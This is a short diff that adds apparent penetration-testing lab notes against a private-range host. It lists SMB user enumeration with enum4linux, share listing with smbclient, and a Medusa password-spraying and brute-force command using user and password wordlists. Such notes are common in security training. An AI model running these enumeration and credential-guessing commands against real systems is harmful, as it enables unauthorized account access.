@@ -1,0 +1,8 @@
+# SMB user enumeration
+enum4linux -U 192.168.56.101
+
+# Additional SMB share enumeration
+smbclient -L \\192.168.56.101\
+
+# SMB password spraying / brute force attack using Medusa
+medusa -h 192.168.56.101 -U ../wordlists/users.txt -P ../wordlists/passwords.txt -M smbnt
